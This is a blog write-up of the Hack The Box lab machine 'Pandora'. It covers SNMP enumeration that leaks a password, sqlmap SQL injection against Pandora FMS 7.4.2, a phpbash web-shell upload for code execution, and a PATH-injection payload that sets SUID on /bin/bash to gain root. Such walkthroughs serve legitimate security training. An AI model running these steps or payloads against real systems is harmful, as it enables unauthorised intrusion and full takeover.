---
title: Pandora
tags: 
    - Pandora FMS
    - Path Injection
    - Easy
date: 2022-01-10
description: "Hack The Box Machine - Pandora writeup"
author: "Tejas"
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: true
disableHLJS: false 
disableHLJS: false
hideSummary: true
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: false
UseHugoToc: true
cover:
    image: "https://pbs.twimg.com/media/FIWiEX3XoAc3_PK?format=jpg&name=large" # image path/url
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---

## Enumeration

### Open Ports Enumeration

### TCP

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB84
```

### UDP

`sudo nmap -sU pandora.htb --min-rate=10000 -vv -oN nmap_udp.txt`

{{< figure src="images/Untitled.png" >}}

Looks like SNMP is running. we shall enumerate it!

`sudo nmap -sU -sV pandora.htb -p161 -vv`

```bash
PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora
```

## Web Enumeration

### Sub Domain Enumeration


{{< figure src="images/Untitled%201.png">}}

Found no subdomains

### Directory Enumeration


{{< figure src="images/Untitled%202.png">}}

Found no useful directory

## SNMP Enumeration

`snmpwalk -c public -v2c 10.10.11.136 | tee snmp.out`

Found the credentials for the user `daniel`


{{< figure src="images/Untitled%203.png">}}

`daniel:HotelBabylon23`

## Foothold

I used the same credentials to SSH into the machine  

{{< figure src="images/Untitled%204.png">}}

{{< figure src="images/Untitled%205.png">}}

### Pandora Console

I found something being hosted locally, lets port forward it using SSH

{{< figure src="images/Untitled%206.png">}}

`ssh daniel@pandora.htb -L 80:127.0.0.1:80`

{{< figure src="images/Untitled%207.png">}}

### Login attempt

{{< figure src="images/Untitled%208.png">}}

It seems like `daniel` has access to API only! Let’s try to mess it up after reading documentation. 

If we notice below the website the version can be found to be Pandora FMS v7.4.2

It seems to be vulnerable to many things. Let’s try SQL injection as per the [article](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained).

### Exploiting SQL Injection

The website is vulnerable to `[http://127.0.0.1/pandora_console/include/chart_generator.php?sessionid=xyz](http://127.0.0.1/pandora_console/include/chart_generator.php?sessionid=xyz)` endpoint. Lets run it in SQLMAP. 

{{< figure src="images/Untitled%209.png">}}

{{< figure src="images/Untitled%2010.png">}}

So SQL Injection was a success! Let’s exfil data from the Database. 

Use `--dbs` flag to list the databases available in the DBMS. 

{{< figure src="images/Untitled%2011.png">}}

We have `pandora` DB, lets check the tables 

Use `-D pandora --tables` flag to list the tables and we have quite a lot of tables. 

`tpassword_history` table had interesting info, it had the password for the Pandora FMS’s admin password. 

After logging in, lets exploit the extension upload vulnerability as described in the same article. 

{{< figure src="images/Untitled%2012.png">}}

I got RCE as Matt.  We have got user flag! 

If you are wondering what is the shell in browser, it is [phpbash](https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php). I zipped the file and uploaded it and then executed the file. 

## Privilege Escalation

I found a custom binary to be present  `/usr/bin/pandora_backup` . I did strings on the binary and found it ran a command. 

{{< figure src="images/Untitled%2013.png">}}

If you noticed that command, you’d have notice how vulnerable it is. Moreover the binary is SETUID binary. So its **path injection.**

### Exploiting Path Injection

Will first Create a file named `tar`

and have its payload the following manner 

```bash
#!/bin/bash 

chmod u+s /bin/bash 
/bin/bash -p

```

and then `chmod +x tar` now export the path `export PATH=.:$PATH` 

Now run the binary and you’ll have got the root shell

{{< figure src="images/Untitled%2014.png">}}

Root shell owned!

P.S Try to have shell in SSH when u are matt.